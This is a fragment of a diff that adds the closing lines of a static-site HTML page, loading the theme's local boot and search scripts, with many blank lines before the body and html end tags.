+<script src="/js/next-boot.js?v=7.4.1"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.1"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
